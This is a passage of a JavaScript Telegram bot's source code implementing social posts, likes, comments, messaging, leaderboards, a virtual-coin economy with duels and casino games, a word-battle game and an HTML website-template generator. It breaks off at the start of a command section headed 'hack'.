  await ctx.answerCbQuery();
  await sendMessage(ctx, `💬 To message this user, use:\n/msg @${await getUsername(parseInt(ctx.match[1]))} [your message]`);
});

// ========== 📸 POST SYSTEM ==========
bot.command("post", async (ctx) => {
  let caption = ctx.message.text.split(" ").slice(1).join(" ") || "";
  
  if (ctx.message.reply_to_message && ctx.message.reply_to_message.photo) {
    let photo = ctx.message.reply_to_message.photo[ctx.message.reply_to_message.photo.length - 1];
    let file = await ctx.telegram.getFile(photo.file_id);
    let filename = `post_${ctx.from.id}_${Date.now()}.jpg`;
    let filepath = path.join(__dirname, "public/uploads", filename);
    
    const fileUrl = `https://api.telegram.org/file/bot${process.env.BOT_TOKEN}/${file.file_path}`;
    const response = await axios({ method: "get", url: fileUrl, responseType: "stream" });
    const writer = fs.createWriteStream(filepath);
    response.data.pipe(writer);
    
    await new Promise((resolve) => writer.on("finish", resolve));
    
    let user = await initUser(ctx.from.id);
    let post = {
      id: Date.now().toString(),
      image: `${DOMAIN}/uploads/${filename}`,
      caption: caption,
      likes: [],
      comments: [],
      shares: [],
      createdAt: new Date()
    };
    user.posts.unshift(post);
    await saveUser(ctx.from.id, user);
    
    for (let followerId of user.followers) {
      await addNotification(followerId, `📸 @${ctx.from.username} posted: "${caption.substring(0, 50)}..."`, "post");
    }
    
    await sendMessage(ctx, `✅ **POST SHARED!**\n🆔 ID: ${post.id}`);
  } else {
    let user = await initUser(ctx.from.id);
    let post = {
      id: Date.now().toString(),
      image: null,
      caption: caption,
      likes: [],
      comments: [],
      shares: [],
      createdAt: new Date()
    };
    user.posts.unshift(post);
    await saveUser(ctx.from.id, user);
    
    for (let followerId of user.followers) {
      await addNotification(followerId, `📝 @${ctx.from.username} posted: "${caption.substring(0, 50)}..."`, "post");
    }
    
    await sendMessage(ctx, `✅ **POST SHARED!**\n📝 "${caption}"\n🆔 ID: ${post.id}`);
  }
});

bot.command("newsfeed", async (ctx) => {
  let user = await initUser(ctx.from.id);
  let feed = [];
  
  let userIds = [ctx.from.id, ...user.friends, ...user.following];
  for (let id of userIds) {
    let u = usersCache.get(id);
    if (u && u.posts) {
      for (let post of u.posts.slice(0, 5)) {
        feed.push({ ...post, authorId: id, authorName: u.displayName || await getUsername(id) });
      }
    }
  }
  
  feed.sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));
  feed = feed.slice(0, 10);
  
  if (feed.length === 0) return sendMessage(ctx, "📭 **No posts in your feed!**\n\nFollow friends or create a post with /post");
  
  for (let post of feed) {
    let timeAgo = Math.floor((Date.now() - new Date(post.createdAt)) / 60000);
    let timeText = timeAgo < 1 ? "just now" : timeAgo < 60 ? `${timeAgo}m ago` : `${Math.floor(timeAgo/60)}h ago`;
    
    let postText = 
`╔══════════════════════════════╗
║ 👤 **${post.authorName}**
║ @${await getUsername(post.authorId)}
║ 🕐 ${timeText}
╠══════════════════════════════╣
║ ${post.caption || "No caption"}
║
║ ❤️ ${post.likes?.length || 0} likes
║ 💬 ${post.comments?.length || 0} comments
║ 🆔 ID: ${post.id}
╚══════════════════════════════╝`;

    let buttons = [[{ text: `❤️ LIKE (${post.likes?.length || 0})`, callback_data: `like_${post.id}` }]];
    
    if (post.image) {
      await ctx.replyWithPhoto(post.image, { caption: postText, parse_mode: "Markdown" });
    } else {
      await ctx.reply(postText, { parse_mode: "Markdown", reply_markup: { inline_keyboard: buttons } });
    }
  }
});

bot.action(/like_(.+)/, async (ctx) => {
  let postId = ctx.match[1];
  let found = false;
  
  for (let [userId, user] of usersCache) {
    let post = user.posts?.find(p => p.id === postId);
    if (post) {
      if (!post.likes.includes(ctx.from.id)) {
        post.likes.push(ctx.from.id);
        await saveUser(userId, user);
        await addNotification(userId, `❤️ @${ctx.from.username} liked your post!`, "like");
        await addXP(ctx.from.id, 2);
        await ctx.answerCbQuery("👍 Liked! +2 XP");
      } else {
        post.likes = post.likes.filter(id => id !== ctx.from.id);
        await saveUser(userId, user);
        await ctx.answerCbQuery("👎 Unliked!");
      }
      found = true;
      break;
    }
  }
  if (!found) await ctx.answerCbQuery("Post not found!");
});

bot.command("like", async (ctx) => {
  let args = ctx.message.text.split(" ");
  if (args.length < 2) return sendMessage(ctx, "❌ Usage: /like [postID]");
  
  let postId = args[1];
  let found = false;
  
  for (let [userId, user] of usersCache) {
    let post = user.posts?.find(p => p.id === postId);
    if (post) {
      if (!post.likes.includes(ctx.from.id)) {
        post.likes.push(ctx.from.id);
        await saveUser(userId, user);
        await addNotification(userId, `❤️ @${ctx.from.username} liked your post!`, "like");
        await addXP(ctx.from.id, 2);
        await sendMessage(ctx, `✅ Liked post! (+2 XP)`);
      } else {
        post.likes = post.likes.filter(id => id !== ctx.from.id);
        await saveUser(userId, user);
        await sendMessage(ctx, `👎 Unliked post!`);
      }
      found = true;
      break;
    }
  }
  if (!found) sendMessage(ctx, "❌ Post not found!");
});

bot.command("comment", async (ctx) => {
  let args = ctx.message.text.split(" ");
  if (args.length < 3) return sendMessage(ctx, "❌ Usage: /comment [postID] [your comment]");
  
  let postId = args[1];
  let comment = args.slice(2).join(" ");
  let found = false;
  
  for (let [userId, user] of usersCache) {
    let post = user.posts?.find(p => p.id === postId);
    if (post) {
      post.comments.push({
        userId: ctx.from.id,
        username: await getUsername(ctx.from.id),
        text: comment,
        createdAt: new Date()
      });
      await saveUser(userId, user);
      await addNotification(userId, `💬 @${ctx.from.username} commented: "${comment.substring(0, 50)}"`, "comment");
      await addXP(ctx.from.id, 2);
      await sendMessage(ctx, `✅ Comment added! (+2 XP)`);
      found = true;
      break;
    }
  }
  if (!found) sendMessage(ctx, "❌ Post not found!");
});

bot.command("myposts", async (ctx) => {
  let user = await initUser(ctx.from.id);
  if (!user.posts || user.posts.length === 0) return sendMessage(ctx, "📭 You have no posts yet!\nCreate one with /post [caption]");
  
  let posts = user.posts.slice(0, 5);
  for (let post of posts) {
    let timeAgo = Math.floor((Date.now() - new Date(post.createdAt)) / 60000);
    let timeText = timeAgo < 1 ? "just now" : timeAgo < 60 ? `${timeAgo}m ago` : `${Math.floor(timeAgo/60)}h ago`;
    
    let text = `📸 **YOUR POST**\n🕐 ${timeText}\n📝 ${post.caption || "No caption"}\n❤️ ${post.likes?.length || 0} likes\n💬 ${post.comments?.length || 0} comments\n🆔 ID: ${post.id}`;
    if (post.image) {
      await ctx.replyWithPhoto(post.image, { caption: text });
    } else {
      await ctx.reply(text);
    }
  }
});

// ========== 🔔 NOTIFICATIONS ==========
bot.command("notifications", async (ctx) => {
  let user = await initUser(ctx.from.id);
  if (!user.notifications || user.notifications.length === 0) return sendMessage(ctx, "🔔 No notifications yet!");
  
  let text = "🔔 **NOTIFICATIONS** 🔔\n\n";
  for (let notif of user.notifications.slice(0, 15)) {
    let icon = notif.type === "like" ? "❤️" : notif.type === "comment" ? "💬" : notif.type === "follow" ? "👥" : "📢";
    text += `${icon} ${notif.message}\n🕐 ${new Date(notif.createdAt).toLocaleString()}\n\n`;
  }
  
  user.unreadNotifs = 0;
  await saveUser(ctx.from.id, user);
  await sendMessage(ctx, text);
});

// ========== 💬 MESSAGING ==========
bot.command("msg", async (ctx) => {
  let args = ctx.message.text.split(" ");
  if (args.length < 3) return sendMessage(ctx, "❌ Usage: /msg @username [message]");
  
  let targetName = args[1].replace("@", "");
  let message = args.slice(2).join(" ");
  
  let targetId = null;
  for (let [id] of usersCache) {
    try {
      let chat = await ctx.telegram.getChat(id);
      if (chat.username === targetName) { targetId = id; break; }
    } catch(e) {}
  }
  
  if (!targetId) return sendMessage(ctx, "❌ User not found!");
  if (targetId === ctx.from.id) return sendMessage(ctx, "❌ Can't message yourself!");
  
  await ctx.telegram.sendMessage(targetId, `💬 **NEW MESSAGE**\n\nFrom: @${ctx.from.username}\n\n📝 ${message}`);
  await sendMessage(ctx, `✅ Message sent to @${targetName}!`);
});

bot.command("inbox", async (ctx) => {
  await sendMessage(ctx, "📬 Check your Telegram DMs for messages from other users!");
});

// ========== 🏆 LEADERBOARDS ==========
bot.command("leaderboard", async (ctx) => {
  let sorted = Array.from(usersCache.values()).sort((a, b) => b.coins - a.coins).slice(0, 15);
  let lines = ["🏆 **TOP 15 RICHEST** 🏆", ""];
  
  for (let i = 0; i < sorted.length; i++) {
    let name = await getUsername(sorted[i].userId);
    let medal = i === 0 ? "👑" : i === 1 ? "🥈" : i === 2 ? "🥉" : "📌";
    lines.push(`${medal} ${i+1}. @${name} | ${sorted[i].coins} coins | Lvl ${sorted[i].level}`);
  }
  await ctx.reply(lines.join("\n"), { parse_mode: undefined });
});

bot.command("topfollowers", async (ctx) => {
  let sorted = Array.from(usersCache.values()).sort((a, b) => b.followers.length - a.followers.length).slice(0, 10);
  let lines = ["👑 **MOST FOLLOWED** 👑", ""];
  for (let i = 0; i < sorted.length; i++) {
    let name = await getUsername(sorted[i].userId);
    lines.push(`${i+1}. @${name} | ${sorted[i].followers.length} followers`);
  }
  await ctx.reply(lines.join("\n"), { parse_mode: undefined });
});

bot.command("topwords", async (ctx) => {
  let sorted = Array.from(usersCache.values()).sort((a, b) => (b.wordWins || 0) - (a.wordWins || 0)).slice(0, 10);
  let lines = ["📝 **TOP WORD WARRIORS** 📝", ""];
  for (let i = 0; i < sorted.length; i++) {
    let name = await getUsername(sorted[i].userId);
    lines.push(`${i+1}. @${name} | ${sorted[i].wordWins || 0} wins`);
  }
  await ctx.reply(lines.join("\n"), { parse_mode: undefined });
});

// ========== 💰 ECONOMY COMMANDS ==========
bot.command("balance", async (ctx) => { 
  let u = await initUser(ctx.from.id); 
  await sendMessage(ctx, `💰 **BALANCE**\n\nCoins: ${u.coins}\n💎 Diamonds: ${u.diamonds}\n📊 Level: ${u.level}\n⭐ XP: ${u.xp}/${u.level * 100}`); 
});

bot.command("daily", async (ctx) => { 
  let u = await initUser(ctx.from.id); 
  let now = Date.now(); 
  if (u.lastDaily && now - u.lastDaily < 86400000) { 
    let remaining = 86400000 - (now - u.lastDaily);
    let h = Math.floor(remaining / 3600000); 
    let m = Math.floor((remaining % 3600000) / 60000);
    return sendMessage(ctx, `⏰ ${h}h ${m}m left until next daily!`); 
  } 
  await addCoin(ctx.from.id, DAILY_REWARD);
  u.lastDaily = new Date(now);
  u.streak = (u.streak % 7) + 1;
  await saveUser(ctx.from.id, u);
  
  if (u.streak === 7 && !u.badges.includes("🔥 Weekly Warrior")) {
    u.badges.push("🔥 Weekly Warrior");
    await saveUser(ctx.from.id, u);
    await sendMessage(ctx, `🎁 **DAILY REWARD**\n✨ +${DAILY_REWARD} COINS!\n🔥 Streak: Day ${u.streak}/7\n🏅 NEW BADGE: 🔥 Weekly Warrior!`);
  } else {
    await sendMessage(ctx, `🎁 **DAILY REWARD**\n✨ +${DAILY_REWARD} COINS!\n🔥 Streak: Day ${u.streak}/7`);
  }
});

bot.command("work", async (ctx) => { 
  let u = await initUser(ctx.from.id); 
  let now = Date.now(); 
  let last = workCD.get(u.userId) || 0; 
  if (now - last < 12 * 60 * 60 * 1000) { 
    let h = Math.floor((12 * 60 * 60 * 1000 - (now - last)) / 3600000); 
    return sendMessage(ctx, `⏰ ${h}h left until you can work again!`); 
  } 
  let jobs = ["💻 Developer", "🎨 Designer", "📝 Writer", "🎮 Tester", "📊 Analyst", "🕵️ Hacker", "👨‍💻 Coder"]; 
  let job = jobs[Math.floor(Math.random() * jobs.length)]; 
  await addCoin(u.userId, WORK_REWARD);
  workCD.set(u.userId, now); 
  await sendMessage(ctx, `💼 Worked as ${job}!\n+${WORK_REWARD} coins`); 
});

bot.command("gift", async (ctx) => {
  let args = ctx.message.text.split(" ");
  if (args.length < 3) return sendMessage(ctx, "❌ Usage: /gift @username amount");
  
  let targetName = args[1].replace("@", "");
  let amount = parseInt(args[2]);
  let sender = await initUser(ctx.from.id);
  
  if (isNaN(amount) || amount < 1) return sendMessage(ctx, "❌ Invalid amount!");
  if (sender.coins < amount) return sendMessage(ctx, `❌ You only have ${sender.coins} coins!`);
  
  let targetId = null;
  for (let [id] of usersCache) {
    try {
      let chat = await ctx.telegram.getChat(id);
      if (chat.username === targetName) { targetId = id; break; }
    } catch(e) {}
  }
  
  if (!targetId) return sendMessage(ctx, "❌ User not found!");
  
  await takeCoin(ctx.from.id, amount);
  await addCoin(targetId, amount);
  await addXP(ctx.from.id, 2);
  
  if (!sender.badges.includes("🎁 Generous")) {
    sender.badges.push("🎁 Generous");
    await saveUser(ctx.from.id, sender);
  }
  
  await sendMessage(ctx, `🎁 **GIFT SENT!**\n\n📤 To: @${targetName}\n💰 Amount: ${amount} coins`);
  await ctx.telegram.sendMessage(targetId, `🎁 **GIFT RECEIVED!**\n\n👤 From: @${ctx.from.username}\n💰 +${amount} COINS!`);
});

bot.command("duel", async (ctx) => {
  let args = ctx.message.text.split(" ");
  if (args.length < 3) return sendMessage(ctx, "❌ Usage: /duel @username amount");
  
  let targetName = args[1].replace("@", "");
  let bet = parseInt(args[2]);
  let challenger = await initUser(ctx.from.id);
  
  if (isNaN(bet) || bet < 10) return sendMessage(ctx, "❌ Min bet 10 coins!");
  if (challenger.coins < bet) return sendMessage(ctx, `❌ You need ${bet} coins!`);
  
  let targetId = null;
  for (let [id] of usersCache) {
    try {
      let chat = await ctx.telegram.getChat(id);
      if (chat.username === targetName) { targetId = id; break; }
    } catch(e) {}
  }
  
  if (!targetId) return sendMessage(ctx, "❌ User not found!");
  
  let target = await initUser(targetId);
  if (target.coins < bet) return sendMessage(ctx, `❌ @${targetName} doesn't have ${bet} coins!`);
  
  duelChallenges.set(targetId, { from: ctx.from.id, bet: bet, status: "waiting" });
  setTimeout(() => duelChallenges.delete(targetId), 60000);
  
  await sendMessage(ctx, `⚔️ **DUEL CHALLENGE SENT!**\n🎯 Target: @${targetName}\n💰 Bet: ${bet} coins`);
  await ctx.telegram.sendMessage(targetId, `⚔️ **DUEL CHALLENGE!**\n\n👤 From: @${ctx.from.username}\n💰 Bet: ${bet} coins\n\nType /acceptduel to fight!`);
});

bot.command("acceptduel", async (ctx) => {
  let challenge = duelChallenges.get(ctx.from.id);
  if (!challenge || challenge.status !== "waiting") return sendMessage(ctx, "❌ No active duel challenge!");
  
  let accepter = await initUser(ctx.from.id);
  let challenger = await initUser(challenge.from);
  
  if (accepter.coins < challenge.bet) return sendMessage(ctx, `❌ You need ${challenge.bet} coins to accept!`);
  
  await takeCoin(ctx.from.id, challenge.bet);
  await takeCoin(challenge.from, challenge.bet);
  
  let challengerPower = challenger.level + (challenger.wins * 0.1);
  let accepterPower = accepter.level + (accepter.wins * 0.1);
  let winner = Math.random() < (challengerPower / (challengerPower + accepterPower)) ? challenge.from : ctx.from.id;
  let loser = winner === ctx.from.id ? challenge.from : ctx.from.id;
  
  await addCoin(winner, challenge.bet * 2);
  await addXP(winner, 15);
  await addXP(loser, 5);
  
  let winnerUser = await initUser(winner);
  winnerUser.wins++;
  await saveUser(winner, winnerUser);
  
  duelChallenges.delete(ctx.from.id);
  
  await ctx.telegram.sendMessage(winner, `🎉 **YOU WON THE DUEL!**\n💰 +${challenge.bet * 2} COINS!`);
  await ctx.telegram.sendMessage(loser, `💀 **YOU LOST THE DUEL!**\n💰 -${challenge.bet} COINS`);
});

// ========== 🎰 CASINO GAMES ==========
bot.command("dice", async (ctx) => {
  let args = ctx.message.text.split(" ");
  let bet = parseInt(args[1]);
  let user = await initUser(ctx.from.id);
  
  if (isNaN(bet) || bet < 1) return sendMessage(ctx, "❌ Usage: /dice [amount] (min 1 coin)");
  if (user.coins < bet) return sendMessage(ctx, `❌ You need ${bet} coins!`);
  
  await takeCoin(ctx.from.id, bet);
  let roll = Math.floor(Math.random() * 6) + 1;
  
  if (roll === 6) {
    let win = bet * 3;
    await addCoin(ctx.from.id, win);
    await addXP(ctx.from.id, 10);
    await ctx.replyWithDice();
    await sendMessage(ctx, `🎲 You rolled **${roll}**! 🎉 **JACKPOT!**\n💰 +${win} coins! (+10 XP)`);
  } else if (roll >= 4) {
    let win = bet;
    await addCoin(ctx.from.id, win);
    await addXP(ctx.from.id, 3);
    await ctx.replyWithDice();
    await sendMessage(ctx, `🎲 You rolled **${roll}**! 🎉 **WINNER!**\n💰 +${win} coins! (+3 XP)`);
  } else {
    await ctx.replyWithDice();
    await sendMessage(ctx, `🎲 You rolled **${roll}**! 💀 **LOST!**\n💰 -${bet} coins`);
  }
});

bot.command("slots", async (ctx) => {
  let args = ctx.message.text.split(" ");
  let bet = parseInt(args[1]);
  let user = await initUser(ctx.from.id);
  
  if (isNaN(bet) || bet < 5) return sendMessage(ctx, "❌ Usage: /slots [amount] (min 5 coins)");
  if (user.coins < bet) return sendMessage(ctx, `❌ You need ${bet} coins!`);
  
  await takeCoin(ctx.from.id, bet);
  let slots = ["🍒", "🍊", "🍋", "🍉", "⭐", "💎", "7️⃣"];
  let result = [slots[Math.floor(Math.random()*slots.length)], slots[Math.floor(Math.random()*slots.length)], slots[Math.floor(Math.random()*slots.length)]];
  
  if (result[0] === result[1] && result[1] === result[2]) {
    let win = bet * 10;
    await addCoin(ctx.from.id, win);
    await addXP(ctx.from.id, 25);
    await sendMessage(ctx, `🎰 ${result.join(" ")} 🎰\n🎉 **MEGA JACKPOT!**\n💰 +${win} coins! (+25 XP)`);
  } else if (result[0] === result[1] || result[1] === result[2] || result[0] === result[2]) {
    let win = bet * 2;
    await addCoin(ctx.from.id, win);
    await addXP(ctx.from.id, 5);
    await sendMessage(ctx, `🎰 ${result.join(" ")} 🎰\n🎉 **WINNER!**\n💰 +${win} coins! (+5 XP)`);
  } else {
    await sendMessage(ctx, `🎰 ${result.join(" ")} 🎰\n💀 **LOST!**\n💰 -${bet} coins`);
  }
});

// ========== 📝 WORD BATTLE ==========
bot.command("wordbattle", async (ctx) => {
  let args = ctx.message.text.split(" ");
  if (args.length < 4) {
    await sendMessage(ctx,
      `📝 **WORD BATTLE** 📝\n\nUsage: /wordbattle @username amount difficulty\n\nDifficulties:\n🍃 easy - 45s, 3 letters (1x)\n⚡ medium - 30s, 5 letters (2x)\n🔥 hard - 15s, 7 letters (3x)\n💀 expert - 8s, 9 letters (5x)\n\n💰 Bet: ${WORD_MIN_BET}-${WORD_MAX_BET} coins`);
    return;
  }
  
  let targetUsername = args[1];
  let betAmount = parseInt(args[2]);
  let difficulty = args[3].toLowerCase();
  
  if (!difficulties[difficulty]) return sendMessage(ctx, "❌ Invalid difficulty!");
  if (isNaN(betAmount) || betAmount < WORD_MIN_BET) return sendMessage(ctx, `❌ Min bet ${WORD_MIN_BET}!`);
  if (betAmount > WORD_MAX_BET) return sendMessage(ctx, `❌ Max bet ${WORD_MAX_BET}!`);
  
  let targetId = null;
  for (let [id] of usersCache) {
    try {
      let c = await ctx.telegram.getChat(id);
      if (c.username === targetUsername.replace("@", "")) { targetId = id; break; }
    } catch(e) {}
  }
  if (!targetId) return sendMessage(ctx, "❌ User not found!");
  if (targetId === ctx.from.id) return sendMessage(ctx, "❌ Can't battle yourself!");
  
  let user = await initUser(ctx.from.id);
  if (user.coins < betAmount) return sendMessage(ctx, `❌ Need ${betAmount} coins!`);
  
  let diff = difficulties[difficulty];
  wordChallenges.set(targetId, { from: ctx.from.id, bet: betAmount, difficulty, letterCount: diff.letters, status: "waiting", timer: diff.timer });
  
  setTimeout(() => { if (wordChallenges.get(targetId)?.status === "waiting") wordChallenges.delete(targetId); }, 60000);
  
  await sendMessage(ctx, `✅ Challenge sent to ${targetUsername}!\n💰 Bet: ${betAmount} coins\n⚡ ${diff.name}`);
  await ctx.telegram.sendMessage(targetId, `📝 **WORD CHALLENGE!**\n\n👤 From: @${ctx.from.username}\n💰 Bet: ${betAmount} coins\n⚡ ${diff.name}\n\nType /acceptword to accept!`);
});

bot.command("acceptword", async (ctx) => {
  let challenge = wordChallenges.get(ctx.from.id);
  if (!challenge || challenge.status !== "waiting") return sendMessage(ctx, "❌ No active challenge!");
  
  let accepter = await initUser(ctx.from.id);
  if (accepter.coins < challenge.bet) return sendMessage(ctx, `❌ Need ${challenge.bet} coins to accept!`);
  
  await takeCoin(challenge.from, challenge.bet);
  await takeCoin(ctx.from.id, challenge.bet);
  
  let diff = difficulties[challenge.difficulty];
  challenge.status = "active";
  challenge.currentTurn = "challenger";
  wordChallenges.set(ctx.from.id, challenge);
  
  let wordList = wordsByLength[challenge.letterCount] || ["WORD"];
  let targetWord = wordList[Math.floor(Math.random() * wordList.length)];
  challenge.targetWord = targetWord;
  wordChallenges.set(ctx.from.id, challenge);
  
  await ctx.telegram.sendMessage(challenge.from, `📝 **YOUR TURN!**\n\nNeed a ${challenge.letterCount}-letter word\n⏱️ Time: ${diff.timer}s\n💰 Pot: ${challenge.bet * 2} coins\n\nType a ${challenge.letterCount}-letter word NOW!`);
  
  setTimeout(async () => {
    let game = wordChallenges.get(ctx.from.id);
    if (game && game.status === "active" && game.currentTurn === "challenger") {
      game.status = "completed";
      wordChallenges.delete(ctx.from.id);
      await addCoin(ctx.from.id, challenge.bet * 2);
      await addXP(ctx.from.id, 10);
      await ctx.telegram.sendMessage(challenge.from, `⏰ **TIME'S UP!** You lost!`);
      await ctx.telegram.sendMessage(ctx.from.id, `🎉 You win! +${challenge.bet * 2} coins!`);
    }
  }, diff.timer * 1000);
  
  await sendMessage(ctx, `✅ Challenge accepted! Pot: ${challenge.bet * 2} coins`);
});

// ========== WORD BATTLE TEXT HANDLER ==========
bot.on("text", async (ctx) => {
  if (ctx.message.text.startsWith("/")) return;
  
  let build = webBuilds.get(ctx.from.id);
  if (build) {
    if (build.step < build.questions.length) {
      build.data[build.questions[build.step]] = ctx.message.text;
      build.step++;
      
      if (build.step < build.questions.length) {
        await sendMessage(ctx, `📝 Step ${build.step + 1}/${build.questions.length}\nSend: ${build.questions[build.step]}`);
      } else {
        await sendMessage(ctx, "⏳ Generating your website...");
        
        let html = htmlTemplates[build.template](build.data);
        let siteName = build.data[build.questions[0]] || "mywebsite";
        let fileName = `${siteName.replace(/[^a-z0-9]/gi, '_')}.html`;
        
        await ctx.replyWithDocument({ source: Buffer.from(html, 'utf-8'), filename: fileName });
        await sendMessage(ctx, `✅ **WEBSITE READY!**\n\n📁 File: ${fileName}\n\n🌐 Upload to Netlify Drop for live link!`);
        
        let website = new Website({ name: siteName, ownerId: ctx.from.id, template: build.template, content: build.data, createdAt: new Date() });
        await website.save();
        
        let user = usersCache.get(ctx.from.id);
        user.websites.push({ name: siteName });
        await saveUser(ctx.from.id, user);
        webBuilds.delete(ctx.from.id);
      }
    }
    return;
  }
  
  for (let [challengedId, challenge] of wordChallenges) {
    if (challenge.status === "active" && challenge.currentTurn === "challenger" && ctx.from.id === challenge.from) {
      let answer = ctx.message.text.toUpperCase().trim();
      let wordList = wordsByLength[challenge.letterCount] || [];
      
      if (wordList.includes(answer)) {
        challenge.status = "completed";
        wordChallenges.delete(challengedId);
        await addCoin(challenge.from, challenge.bet * 2);
        await addXP(challenge.from, 15);
        let user = usersCache.get(challenge.from);
        if (user) {
          user.wordWins++;
          await saveUser(challenge.from, user);
        }
        await sendMessage(ctx, `🎉 **CORRECT!** "${answer}" is valid!\n💰 Won ${challenge.bet * 2} coins! (+15 XP)`);
        await ctx.telegram.sendMessage(challengedId, `💀 You lost! "${answer}" was correct!\n💰 Lost ${challenge.bet} coins`);
      } else {
        challenge.status = "completed";
        wordChallenges.delete(challengedId);
        await addCoin(challengedId, challenge.bet * 2);
        await addXP(challengedId, 15);
        let user = usersCache.get(challengedId);
        if (user) {
          user.wordWins++;
          await saveUser(challengedId, user);
        }
        await sendMessage(ctx, `❌ **WRONG!** "${answer}" is not a valid ${challenge.letterCount}-letter word!\n💰 Lost ${challenge.bet} coins`);
        await ctx.telegram.sendMessage(challengedId, `🎉 You win! "${answer}" was wrong!\n💰 Won ${challenge.bet * 2} coins! (+15 XP)`);
      }
      return;
    }
  }
  
  await addXP(ctx.from.id, 1);
});

// ========== 🌐 WEBSITE COMMANDS ==========
const htmlTemplates = {
  portfolio: (data) => `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>${data.name || 'Portfolio'}</title><link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet"><style>*{margin:0;padding:0;box-sizing:border-box;}body{font-family:'Inter',sans-serif;background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);color:white;min-height:100vh;}.container{max-width:1200px;margin:0 auto;padding:40px 20px;}.hero{text-align:center;padding:80px 0;}.hero h1{font-size:56px;background:linear-gradient(45deg,#FF6B6B,#4ECDC4);-webkit-background-clip:text;-webkit-text-fill-color:transparent;}.btn{background:linear-gradient(45deg,#FF6B6B,#4ECDC4);color:white;padding:12px 30px;border-radius:30px;text-decoration:none;display:inline-block;}.section{background:rgba(255,255,255,0.05);border-radius:20px;padding:40px;margin:40px 0;}footer{text-align:center;padding:40px;}</style></head><body><div class="container"><div class="hero"><h1>${data.name || 'Welcome'}</h1><p>${data.title || 'Creative Developer'}</p><a href="#" class="btn">Hire Me</a></div><div class="section"><h2>About Me</h2><p>${data.bio || 'Passionate creator.'}</p></div><footer><p>Built with SlimeTrackerX</p></footer></div></body></html>`,
  business: (data) => `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>${data.company || 'Business'}</title><link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap" rel="stylesheet"><style>*{margin:0;padding:0;box-sizing:border-box;}body{font-family:'Poppins',sans-serif;background:#0a0a0a;color:#fff;}.navbar{background:rgba(10,10,10,0.95);padding:20px 40px;}.logo{font-size:28px;font-weight:800;background:linear-gradient(45deg,#FFD700,#FF6347);-webkit-background-clip:text;-webkit-text-fill-color:transparent;}.hero{background:linear-gradient(135deg,#1a1a2e,#16213e);text-align:center;padding:120px 20px;}.btn{background:linear-gradient(45deg,#FFD700,#FF6347);color:#1a1a2e;padding:15px 40px;border-radius:40px;text-decoration:none;display:inline-block;}.container{max-width:1200px;margin:0 auto;padding:80px 20px;}.services{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:30px;}.service-card{background:rgba(255,255,255,0.05);border-radius:20px;padding:40px;text-align:center;}footer{text-align:center;padding:40px;}</style></head><body><div class="navbar"><div class="logo">${data.company || 'Business'}</div></div><div class="hero"><h1>${data.company || 'Welcome'}</h1><p>${data.tagline || 'Excellence Since 2024'}</p><a href="#" class="btn">Get Started</a></div><div class="container"><div class="services"><div class="service-card"><h3>${data.service1 || 'Innovation'}</h3><p>${data.service1_desc || 'Solutions'}</p></div></div></div><footer><p>Built with SlimeTrackerX</p></footer></body></html>`,
  store: (data) => `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>${data.store || 'Store'}</title><link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet"><style>*{margin:0;padding:0;box-sizing:border-box;}body{font-family:'Inter',sans-serif;background:#f8f9fa;}.navbar{background:white;padding:20px 40px;box-shadow:0 2px 20px rgba(0,0,0,0.1);}.logo{font-size:28px;font-weight:800;background:linear-gradient(45deg,#667eea,#764ba2);-webkit-background-clip:text;-webkit-text-fill-color:transparent;}.hero{background:linear-gradient(135deg,#667eea,#764ba2);color:white;text-align:center;padding:80px 20px;}.products{max-width:1200px;margin:60px auto;padding:0 20px;display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:30px;}.product-card{background:white;border-radius:20px;padding:20px;text-align:center;box-shadow:0 5px 20px rgba(0,0,0,0.1);}.product-price{font-size:24px;font-weight:800;color:#667eea;margin:10px 0;}footer{background:#1a1a2e;color:white;text-align:center;padding:40px;}</style></head><body><div class="navbar"><div class="logo">${data.store || 'Store'}</div></div><div class="hero"><h1>${data.store || 'Welcome'}</h1><p>${data.tagline || 'Best Prices'}</p></div><div class="products"><div class="product-card"><h3>${data.product1 || 'Product 1'}</h3><div class="product-price">$${data.product1_price || '49'}</div><button style="background:#667eea;color:white;border:none;padding:10px 20px;border-radius:10px;">Buy</button></div></div><footer><p>Built with SlimeTrackerX</p></footer></body></html>`
};

bot.command("createweb", async (ctx) => {
  let args = ctx.message.text.split(" ");
  let template = args[1];
  let u = await initUser(ctx.from.id);
  
  const templates = ["portfolio", "business", "store"];
  const questions = {
    portfolio: ["name", "title", "bio"],
    business: ["company", "tagline", "service1"],
    store: ["store", "tagline", "product1", "product1_price"]
  };
  
  if (!template || !templates.includes(template)) {
    return sendMessage(ctx, `🌐 **WEB CREATOR**\n\n/createweb portfolio\n/createweb business\n/createweb store\n💰 Cost: ${WEB_PRICE} coins`);
  }
  
  if (u.coins < WEB_PRICE) return sendMessage(ctx, `❌ Need ${WEB_PRICE} coins!`);
  
  await takeCoin(ctx.from.id, WEB_PRICE);
  webBuilds.set(ctx.from.id, { template, step: 0, data: {}, questions: questions[template] });
  await sendMessage(ctx, `✅ Template: ${template}\n💰 -${WEB_PRICE} coins\n\n📝 Step 1/${questions[template].length}\nSend: ${questions[template][0]}`);
});

bot.command("mywebsites", async (ctx) => {
  let websites = await Website.find({ ownerId: ctx.from.id });
  if (websites.length === 0) return sendMessage(ctx, "📭 No websites yet!");
  let message = "🌐 **YOUR WEBSITES** 🌐\n\n";
  for (let site of websites) message += `📌 ${site.name}\n📅 ${new Date(site.createdAt).toLocaleDateString()}\n\n`;
  await sendMessage(ctx, message);
});

// ========== 💀 HACK COMMANDS ==========
bot.command("hack", async (ctx) => {
  let args = ctx.message.text.split(" ");
  if (args.length < 2) {
